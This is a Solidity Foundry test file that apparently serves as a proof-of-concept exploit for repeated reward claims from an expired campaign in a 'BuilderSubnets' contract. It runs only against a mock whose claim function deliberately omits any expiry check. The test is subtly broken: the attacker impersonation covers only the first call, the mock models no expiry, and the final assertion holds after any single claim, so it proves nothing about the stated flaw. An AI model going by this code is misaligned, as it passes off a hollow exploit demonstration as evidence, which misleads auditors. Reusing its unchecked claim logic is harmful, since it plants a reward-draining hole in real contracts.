// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interface for the BuilderSubnets contract
interface IBuilderSubnets {
    function claim(uint256 campaignId) external;
    function getRewardBalance(uint256 campaignId) external view returns (uint256);
}

contract ExploitTest is Test {
    IBuilderSubnets builderSubnets;
    address attacker = address(0xdeadbeef);
    uint256 initialRewardBalance;

    function setUp() public {
        // Deploy the BuilderSubnets contract (mocked for this test)
        builderSubnets = IBuilderSubnets(address(new MockBuilderSubnets()));

        // Set initial state
        initialRewardBalance = builderSubnets.getRewardBalance(1);

        // Fund the attacker with some ETH for gas
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        // Impersonate the attacker
        vm.prank(attacker);

        // Step 1: Claim rewards from an expired campaign
        builderSubnets.claim(1);

        // Step 2: Repeatedly claim rewards from the same expired campaign
        builderSubnets.claim(1);
        builderSubnets.claim(1);

        // Assert the vulnerability
        // The reward balance should be depleted due to repeated claims
        uint256 finalRewardBalance = builderSubnets.getRewardBalance(1);
        assertLt(finalRewardBalance, initialRewardBalance);
    }
}

// Mock implementation of the BuilderSubnets contract
contract MockBuilderSubnets is IBuilderSubnets {
    mapping(uint256 => uint256) private rewardBalances;

    constructor() {
        // Initialize a campaign with some rewards
        rewardBalances[1] = 1000 ether;
    }

    function claim(uint256 campaignId) external override {
        // Simulate reward claim without checking if the campaign is expired
        require(rewardBalances[campaignId] > 0, "No rewards left");
        rewardBalances[campaignId] -= 100 ether;
    }

    function getRewardBalance(uint256 campaignId) external view override returns (uint256) {
        return rewardBalances[campaignId];
    }
}